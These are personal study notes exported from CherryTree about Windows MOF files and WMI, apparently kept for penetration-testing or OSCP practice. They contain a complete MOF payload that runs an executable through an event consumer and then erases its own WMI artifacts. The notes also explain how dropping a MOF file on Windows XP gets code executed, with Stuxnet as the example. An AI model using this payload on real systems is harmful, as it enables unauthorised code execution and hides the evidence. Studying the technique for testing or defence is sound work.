<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MOF</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># MOF - Managed Object Format</h1></strong><br /><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-">https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-</a><br /><br />WMI classes are (as far as I can understand) bundles WMI commands put together to execute a task.<br />I think of them like functions in a programming language.<br /><br />Windows already provides a ton of WMI classes:<br /><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-system-classes">https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-system-classes</a><br /><br />You can create your own WMI classes using MOF files - <code>myclass.MOF</code><br />You write the WMI commands into a MOF file, <br />compile it with <code>Mofcomp.exe</code>,<br />and drop it in the WMI repoistory so it can later be used.<br /><br />Here&#39;s an example MOF script (taken from <a href="https://github.com/T3jv1l/Femitter-FTP-Server-exploit-/blob/master/Femitter.py">here</a>)<br />As far as I can understand, this script:<br />• runs <code>C:\Windows\system32\zzzzz.exe</code><br />• and deletes its own WMI class after it has run<br /><div class="codebox"><div class="codebox">#pragma&nbsp;namespace(&quot;\\\\\\\\.\\\\root\\\\cimv2&quot;)<br />class&nbsp;MyClass54266<br />{<br />&nbsp;&nbsp;	[key]&nbsp;string&nbsp;Name;<br />};<br />class&nbsp;ActiveScriptEventConsumer&nbsp;:&nbsp;__EventConsumer<br />{<br />&nbsp;	[key]&nbsp;string&nbsp;Name;<br />&nbsp;&nbsp;	[not_null]&nbsp;string&nbsp;ScriptingEngine;<br />&nbsp;&nbsp;	string&nbsp;ScriptFileName;<br />&nbsp;&nbsp;	[template]&nbsp;string&nbsp;ScriptText;<br />&nbsp;&nbsp;uint32&nbsp;KillTimeout;<br />};<br />instance&nbsp;of&nbsp;__Win32Provider&nbsp;as&nbsp;$P<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;=&nbsp;&quot;ActiveScriptEventConsumer&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;CLSID&nbsp;=&nbsp;&quot;{266c72e7-62e8-11d1-ad89-00c04fd8fdff}&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;PerUserInitialization&nbsp;=&nbsp;TRUE;<br />};<br />instance&nbsp;of&nbsp;__EventConsumerProviderRegistration<br />{<br />&nbsp;&nbsp;Provider&nbsp;=&nbsp;$P;<br />&nbsp;&nbsp;ConsumerClassNames&nbsp;=&nbsp;{&quot;ActiveScriptEventConsumer&quot;};<br />};<br />Instance&nbsp;of&nbsp;ActiveScriptEventConsumer&nbsp;as&nbsp;$cons<br />{<br />&nbsp;&nbsp;Name&nbsp;=&nbsp;&quot;ASEC&quot;;<br />&nbsp;&nbsp;ScriptingEngine&nbsp;=&nbsp;&quot;JScript&quot;;<br />&nbsp;&nbsp;ScriptText&nbsp;=&nbsp;&quot;\\ntry&nbsp;{var&nbsp;s&nbsp;=&nbsp;new&nbsp;ActiveXObject(\\&quot;Wscript.Shell\\&quot;);\\ns.Run(\\&quot;zzzzz.exe\\&quot;);}&nbsp;catch&nbsp;(err)&nbsp;{};\\nsv&nbsp;=&nbsp;GetObject(\\&quot;winmgmts:root\\\\\\\\cimv2\\&quot;);try&nbsp;{sv.Delete(\\&quot;MyClass54266\\&quot;);}&nbsp;catch&nbsp;(err)&nbsp;{};try&nbsp;{sv.Delete(\\&quot;__EventFilter.Name=&#39;instfilt&#39;\\&quot;);}&nbsp;catch&nbsp;(err)&nbsp;{};try&nbsp;{sv.Delete(\\&quot;ActiveScriptEventConsumer.Name=&#39;ASEC&#39;\\&quot;);}&nbsp;catch(err)&nbsp;{};&quot;;<br />};<br />instance&nbsp;of&nbsp;__EventFilter&nbsp;as&nbsp;$Filt<br />{<br />&nbsp;&nbsp;Name&nbsp;=&nbsp;&quot;instfilt&quot;;<br />&nbsp;&nbsp;Query&nbsp;=&nbsp;&quot;SELECT&nbsp;*&nbsp;FROM&nbsp;__InstanceCreationEvent&nbsp;WHERE&nbsp;TargetInstance.__class&nbsp;=&nbsp;\\&quot;MyClass54266\\&quot;&quot;;<br />&nbsp;&nbsp;QueryLanguage&nbsp;=&nbsp;&quot;WQL&quot;;<br />};<br />instance&nbsp;of&nbsp;__FilterToConsumerBinding&nbsp;as&nbsp;$bind<br />{<br />&nbsp;&nbsp;Consumer&nbsp;=&nbsp;$cons;<br />&nbsp;&nbsp;Filter&nbsp;=&nbsp;$Filt;<br />};<br />instance&nbsp;of&nbsp;MyClass54266&nbsp;as&nbsp;$MyClass<br />{<br />&nbsp;&nbsp;Name&nbsp;=&nbsp;&quot;ClassConsumer&quot;;<br />};</div></div><br /><br /><strong>Links</strong><br />• <a href="https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html</a> - really good/overall +detail view<br />• <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows</a><br />• <a href="https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html#mof-file-wmi-exploitation--system-shell">https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html#mof-file-wmi-exploitation--system-shell</a> - easy/straightforward<br />• <a href="https://www.youtube.com/watch?v=QzP5nUEhZeg">https://www.youtube.com/watch?v=QzP5nUEhZeg</a> - IppSec DropZone<br />• <a href="https://www.youtube.com/watch?v=0SjMgnGwpq8">https://www.youtube.com/watch?v=0SjMgnGwpq8</a> - BlackHat 2015 - Abusing Windows Management Instrumentation (WMI)<br />• <a href="https://www.youtube.com/watch?v=JCJl2uV8u1c">There’s Something About WMI</a> - Sans DFIR 2015<br /><br /><strong><h2>## Exploiting MOF</h2></strong><br />MOF files don&#39;t have to be compiled with <code>Mofcomp.exe</code>.<br />If you store a MOF file in <code>C:\Windows\System32\wbem\MOF</code><br />it will be automatically compiled and registered into the WMI repository.<br />   ◇ this is only true on Windows XP. On Vista and higher, MOF files are <em>not</em> automatically compiled<br /><br /><code>C:\Windows\System32\wbem\mof\Logs\</code> contains logs about the compiled MOF files.<br /><br />This is how stuxnet executed on remote machines.<br />It dropped:<br />• <code>C:\Windows\system32\winsta.exe</code> - Stuxnet&#39;s main module<br />• <code>C:\Windows\system32\wbem\mof\sysnullevnt.mof</code> - a MOF file that will automatically compile itself and execute <code>winsta.exe</code> upon an event<br /><br /><strong>Examples</strong><br />• hackthebox DropZone<br />• OSCP 10.11.1.125 - Sherlock<br /><br />Exploit example:<br /><a href="https://github.com/T3jv1l/Femitter-FTP-Server-exploit-/blob/master/Femitter.py">https://github.com/T3jv1l/Femitter-FTP-Server-exploit-/blob/master/Femitter.py</a><br /></div>
</body>
</html>
